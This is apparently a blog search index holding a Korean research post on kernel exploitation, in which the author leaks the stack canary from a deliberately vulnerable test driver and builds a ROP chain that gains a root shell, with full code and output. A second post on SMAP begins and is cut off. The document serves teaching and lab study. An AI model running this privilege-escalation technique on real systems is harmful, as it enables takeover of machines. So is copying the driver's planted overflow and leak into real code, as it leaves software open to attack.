<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing SSP</title>
    <link href="/2021/10/03/linux-kernel-exploit-bypassing-ssp/"/>
    <url>/2021/10/03/linux-kernel-exploit-bypassing-ssp/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMAP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMAP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMAP"></a>[Research] Linux Kernel Exploit - Bypassing SMAP</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 공격하는 과정을 포스트하려고 한다. 해당 포스트에서는 SSP 보호기법을 주제로 하여 해당 보호기법이 어떠한 보호기법인지 이해하고 이를 우회하여 공격하는 방법을 작성하려고 한다.</p></br></br><h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2></br><p><img src="/img/canary.jpg"></p></br><p><b>SSP(Stack Smashing Protector)</b>은 Stack에서의 지정된 버퍼 크기 이상의 데이터가 입력되어 실행흐름이 변조될 경우 버퍼와 Return Address 사이의 임의의 난수값을 설정해두어 함수가 종료된 후 해당 함수를 호출한 영역(Caller)으로 돌아가기 이전에 이를 확인하는 보호기법을 의미한다.</p></br><p>나에게 있어서는 스택 카나리라는 이름으로 더욱 익숙하다. 사실 해당 기법이 아이디어는 하나인데 별명(Stack Canary, Stack Cookie, Stack Guard…)은 운영체제에 따라서도 다르게 불리어지고 하니까 이름이 중요한 것 보다 아이디어에 집중하는 것이 좋을 것으로 판단된다. 이러한 인사이트를 나만의 경험으로 제시하기 위해서 재밌는(?) 부가설명을 덧붙히겠다.</p></br><p>상단에 제시된 그림의 경우는 버드박스(2018)라는 영화이다. 사람이 눈으로 확인할 수 없는 괴물이 나오는 영화인데 새를 데리고 다니면 새는 이러한 괴물을 감지하는 역할을 한다. 광산에서도 유독가스가 발생하면 예전에는 카나리아를 이용해서 위험성을 감지하고 대피하였다고 한다. 그래서 소프트웨어 입장에서는 공격상황에 대한 감지로 스택에 있는 카나리아라고 불린다고 이름을 들었던 것 같다. 제일 흥미로운 이름으로 지정되었으니까 앞으로는 스택 카나리라고 부르겠다.</p></br><p>실제 구현원리는 매우 직관적이며 간단하다. 버퍼와 Return Address 사이의 임의의 난수값을 설정해두어 이를 확인하는 원리이다. 그렇다면 스택 기반에서 오버 플로우를 발생시키기 이전 <u>스택 카나리의 값을 공격자가 알 수 있는 환경</u>이라고 하면 이를 고려하여 오버 플로우를 발생시키면 되는 것이다.</p><p></br></br></p><h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \-cpu qemu64,smep,smap \</code></pre><p>부팅 스크립트의 경우 다음과 같은 형태로 작성되어 있다. 적용된 보호기법을 확인해보면 KASLR의 경우는 비활성화 해두었으며 SMEP과 SMAP의 경우는 활성화 되어 있다. </p><p>환경분석에서는 기재할 수 없지만 디바이스 드라이버를 컴파일 할 경우 기본적으로 SSP가 활성화되어 컴파일되므로 모든 함수 에필로그에서 Stack Canary가 오염되었는 지 확인하는 로직이 자동적으로 추가된다.</p><p></br></br></p><h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos);<br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .read   = test_read,<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kzalloc(count, GFP_KERNEL);<br>    memcpy(ptr, arr, count);<br><br>    copy_to_user(buf, ptr, count);<br><br>    return 0;<br>&#125;<br><br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]); <br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure><p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 read, write 시스템 콜에 대응하는 동작들을 정의하고 있다.</p><p>디바이스 드라이버 파일을 토대로 read 시스템 콜을 호출하게 될 경우 test_read() 함수가 실행된다. 해당 함수가 실행될 경우 line33에 의하여 커널에서 메모리를 동적할당한 후 커널의 스택 버퍼에 있는 데이터를 복사해오는 것을 확인할 수 있다. 해당 로직에서 값을 복사하는 count가 공격자가 임의로 변경할 수 있기 때문에 커널 스택 버퍼에 있는 값들을 leak할 수 있다. 해당 시스템 호출을 통해서 stack canary를 알 수 있다. </p><p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_wrtie() 함수가 실행된다. 해당 함수가 실행될 경우 line48에 의하여 유저영역의 메모리를 커널의 스택버퍼에 복사하기에 이를 통한 메모리 오염(memory corruption)이 가능하다. 결과적으로 return address를 조작할 수 있음으로 실행 흐름의 변조가 가능할 것으로 보여진다.</p><p></br></br></p><h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 커널 스택의 정보를 알 수 있으며 실행흐름을 변조할 가능성이 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)이 버퍼 오버플로우를 발생시키기 때문이다. 예상한 결과가 맞는가에 대해서 확인해볼 필요가 있다.</p></br><h3 id="공격-코드-1"><a href="#공격-코드-1" class="headerlink" title="공격 코드(1)"></a>공격 코드(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>디바이스 드라이버를 제어하는 코드를 작성하였다. 디바이스에 해당하는 파일을 통해 read 시스템 콜을 호출함을 통해서 커널 스택의 정보를 유출(leak)해보려고 한다. 총 48바이트 크기의 데이터를 출력해봄으로 어떠한 부분이 카나리로 예상될 지 출력할 수 있다. 디바이스 드라이버의 test_read() 함수 내부의 버퍼의 크기는 8바이트이므로 충분한 크기의 정보를 출력한다는 것을 가정해서 진행해보겠다.</p></br><h3 id="공격-결과-1"><a href="#공격-결과-1" class="headerlink" title="공격 결과(1)"></a>공격 결과(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./leak canary[0] = 0canary[1] = 7f78bbec01f33a00canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ec900/ $ ./leak canary[0] = 0canary[1] = 875b1e91019ab700canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9eca00/ $ ./leak canary[0] = 0canary[1] = c24444f6245e5700canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ecb00/ $ ./leak canary[0] = 0canary[1] = 92fb1f83c3973e00canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ec900/ $ ./leak canary[0] = 0canary[1] = 2ed61794e0235300canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9eca00</code></pre><p>작성하였던 코드를 토대로 커널 스택 버퍼에 있는 데이터를 유출(leak)해본 결과 다음과 같은 형태이다. 사실 디버깅을 진행하면 어떠한 위치가 스택 카나리에 해당하는 값인지 명확히 알 수 있지만 현재의 결과를 보았을 때 커널 버퍼의 사이즈는 8이며 이후의 값부터 가장 규칙성을 띄지 않는 스택 카나리라고 판단되는 값은 canary[1]에 해당하는 값으로 판단된다. </p><p>또한 위에서는 제시하지 않았지만 이전 포스트에서 제시하였던 방법과 동일하게 return address를 확인해본 결과 버퍼에서 40바이트 떨어진 곳이 return address로 판단된다.</p></br><h3 id="공격-코드-2"><a href="#공격-코드-2" class="headerlink" title="공격 코드(2)"></a>공격 코드(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br>    size_t payload[20] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Leak Stack Canary<br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    // STEP2. Corrupt Stack Memory<br>    payload[0] = canary[1];<br>    payload[1] = canary[1];<br>    payload[2] = canary[1];<br>    payload[3] = canary[1];<br>    payload[4] = canary[1];<br>    payload[5] = 0x4343434343434343;<br><br>    write(fd, payload, sizeof(payload));<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="공격-결과-2"><a href="#공격-결과-2" class="headerlink" title="공격 결과(2)"></a>공격 결과(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./crash canary[0] = 0canary[1] = 77aa91d07abac300canary[2] = 30canary[3] = 1canary[4] = ffffffff811e311bcanary[5] = ffff88801d9ec300[    3.942545] arr : 0[    3.942953] general protection fault: 0000 [#1] SMP NOPTI[    3.944977] CPU: 0 PID: 70 Comm: crash Tainted: G           O      5.8.5 #1[    3.946180] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    3.948119] RIP: 0010:0x4343434343434343[    3.949110] Code: Bad RIP value.[    3.955544] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286[    3.955840] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000[    3.956295] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    3.956783] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007[    3.957227] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300[    3.957691] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0[    3.958258] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    3.958848] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    3.960591] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0[    3.961172] Call Trace:[    3.962152]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    3.964479] Modules linked in: test(O)[    3.965730] ---[ end trace e9e73822d90c8f9d ]---[    3.967058] RIP: 0010:0x4343434343434343[    3.967454] Code: Bad RIP value.[    3.967779] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286[    3.968107] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000[    3.968623] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    3.969116] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007[    3.969657] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300[    3.970123] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0[    3.970625] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    3.971228] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    3.971760] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0[    3.972372] Kernel panic - not syncing: Fatal exception[    3.973145] Kernel Offset: disabled[    3.973878] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre></br><p>작성한 공격코드를 토대로 공격을 수행해본 결과 의도하였던 바와 같이 실행흐름을 담당하는 레지스터 RIP가 변조된 것을 확인할 수 있었다. 만약 스택 카나리의 값이 일치하지 않았다면 다음과 같은 형태의 커널 패닉이 아닌 Stack Smashing Detected와 같은 다른 형태의 정보를 보여주었을 것이다. 그러므로 추출한 카나리의 값은 정상적인 형태의 카나리이며 SSP를 우회하여 실행흐름을 변조할 수 있다는 결론을 내렸다.</p><p></br></br></p><h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 사용자의 입력(untrusted input)을 통해 실행흐름을 변조할 수 있음을 확인하였다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p><p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. </p></br><h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. stack canary 유출(leak) STEP2. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승STEP3. 사용자 모드(user mode)로의 전환STEP4. shell 획득</code></pre><p>해당 시나리오의 경우 지금까지 작성해왔던 일반적인 익스플로잇과 유사하다. SMEP, SMAP이 적용되어 있으므로 시나리오에 해당하는 페이로드를 Kernel ROP를 기반으로 하여 진행하며 SSP가 적용되어 있으므로 stack canary의 값을 고려하여 공격을 수행하여야 한다. 그러므로 우선적으로 STEP1에 해당하는 leak을 먼저 수행하여 해당 값을 토대로 페이로드를 작성해야 한다.</p></br><h3 id="가젯-구성"><a href="#가젯-구성" class="headerlink" title="가젯 구성"></a>가젯 구성</h3><p>가젯 구성의 경우 <a href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#가젯-구성">Bypassing SMEP</a>에 작성한 형태와 동일하기에 해당 과정의 기재는 생략하도록 하겠다.</p></br><h3 id="가젯-추출"><a href="#가젯-추출" class="headerlink" title="가젯 추출"></a>가젯 추출</h3><p>가젯 추출의 경우 <a href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#가젯-추출">Bypassing SMEP</a>에 작성한 형태와 동일하기에 해당 과정의 기재는 생략하도록 하겠다.</p></br><h3 id="공격코드"><a href="#공격코드" class="headerlink" title="공격코드"></a>공격코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t payload[20] = &#123;0, &#125;;<br>    size_t *canary[2] = &#123;0, &#125;;<br>    int i = 0;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    printf(&quot;canary = %lx\n&quot;, canary[1]);<br><br>    backup_rv();<br><br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = 0xffffffff813fb9bc;    // pop rdi; ret;<br>    payload[i++] = 0;<br>    payload[i++] = prepare_kernel_cred;<br>    payload[i++] = 0xffffffff813f4eca;    // pop rcx; ret;<br>    payload[i++] = 0;<br>    payload[i++] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;<br>    payload[i++] = commit_creds;<br>    payload[i++] = 0xffffffff81c00f58;    // swapgs; ret;<br>    payload[i++] = 0xffffffff810252b2;    // iretq; ret;<br>    payload[i++] = &amp;shell;<br>    payload[i++] = rv.user_cs;<br>    payload[i++] = rv.user_rflags;<br>    payload[i++] = rv.user_rsp;<br>    payload[i++] = rv.user_ss;<br><br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="공격결과"><a href="#공격결과" class="headerlink" title="공격결과"></a>공격결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit canary = c6fd32469a343500/ # whoamiroot/ # </code></pre><p></br></br></p><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - 리눅스 커널 해킹. A부터 Z까지https://www.lazenca.net/pages/viewpage.action?pageId=25624859https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</code></pre><p></br></br></p><h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>🗡️ ❌ 🛡️</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>smep</tag>
      
      <tag>smap</tag>
      
      <tag>ssp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing SMAP</title>
    <link href="/2021/10/02/linux-kernel-exploit-bypassing-smap/"/>
    <url>/2021/10/02/linux-kernel-exploit-bypassing-smap/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMAP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMAP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMAP"></a>[Research] Linux Kernel Exploit - Bypassing SMAP</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 공격하는 과정을 포스트하려고 한다. 해당 포스트에서는 SMAP 보호기법을 주제로 하여 해당 보호기법이 어떠한 보호기법인지 이해하고 이를 우회하여 공격하는 방법을 작성하려고 한다.</p></br></br><h2 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h2></br><p><img src="/img/cr4.PNG"></p></br><p><b>SMAP(Supervisor Mode Access Prevention)</b>은 supervisor mode(ring0)에서 특정 주소에 있는 데이터를 접근할 경우 해당 주소가 만약 user mode(ring3)의 데이터라고 할 경우 이를 접근할 수 없도록 하는 보호기법이다.</p></br><p>SMAP은 CPU의 CR4 Register의 SMAP에 해당하는 부분의 비트를 키거나 끔으로 적용이 가능하다. 또한 SMAP이 적용되어 있을 경우 Kernel ROP를 이용하면 우회가 가능하다. 이는 결과적으로 지난 포스트에서의 익스플로잇 코드를 통해서도 공격자는 권한 상승 후의 쉘 획득이 가능하다는 것을 의미한다. Kernel ROP를 통해 우회를 진행하였음으로 해당 포스트에서는 CR4 레지스터의 값을 변조하는 형태로 익스플로잇을 진행해보려고 한다.</p><p></br></br></p><h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \-cpu qemu64,smep,smap \</code></pre><p>부팅 스크립트의 경우 다음과 같은 형태로 작성되어 있다. 적용된 보호기법을 확인해보면 KASLR의 경우는 비활성화 해두었으며 SMEP과 SMAP의 경우는 활성화 되어 있다. </p><p></br></br></p><h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 